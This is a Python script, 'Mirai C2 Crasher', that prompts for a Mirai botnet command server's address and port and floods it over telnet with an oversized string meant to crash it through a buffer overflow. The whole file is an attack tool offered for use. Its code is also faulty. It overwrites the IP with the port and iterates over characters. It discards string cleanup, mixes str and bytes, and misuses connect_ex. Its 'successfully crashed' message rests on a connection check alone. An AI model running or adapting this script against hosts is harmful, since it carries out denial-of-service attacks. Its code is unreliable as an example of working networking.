# Project Name: Mirai C2 Crasher
# Project Author: VoidLSD
# Project Reason: Mirai C2 Crasher exploits a certain part of the code to cause buffer overflow.

import os
import time
import colorama
import telnetlib
import random
import socket
from colorama import Fore
from threading import Thread

intro = f"""
{Fore.RED}███╗   ███╗ ██████╗ █████╗
{Fore.GREEN}████╗ ████║██╔════╝██╔════╝
{Fore.RED}██╔████╔██║██║     ██
{Fore.GREEN}██║╚██╔╝██║██║     ██
{Fore.RED}██║ ╚═╝ ██║╚██████╗╚█████╗
{Fore.GREEN}╚═╝     ╚═╝ ╚═════╝ ╚═════╝
{Fore.RED}    Mirai C2 Crasher
{Fore.GREEN}   Created By VoidLSD
"""
os.system("clear")
print(intro)

c2ip = input(("C2 IP: "))
c2ip = str(c2ip)
c2port = input(("C2 Port: "))
c2ip = str(c2port)
payload = "void"+"d"*9999
timeout = 3
somesock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
tn = telnetlib.Telnet()

def crash(crasher):
	tn.open(crasher, c2port, timeout)
	tn.write(payload)

for crasher in c2ip:
	crasher.replace("https://", "")
	crasher.replace("http://", "")
	crasher.replace("/", "")
	crasher2 = Thread(target=crash, args=(c2ip,))
	crasher2.start()
	result = somesock.connect_ex(c2ip,c2port)
	if result == 0:
		print(Fore.GREEN+"C2 has been successfully crashed!")
	else:
		print(Fore.RED+"did not connect, did you put the C2 IP correctly?")
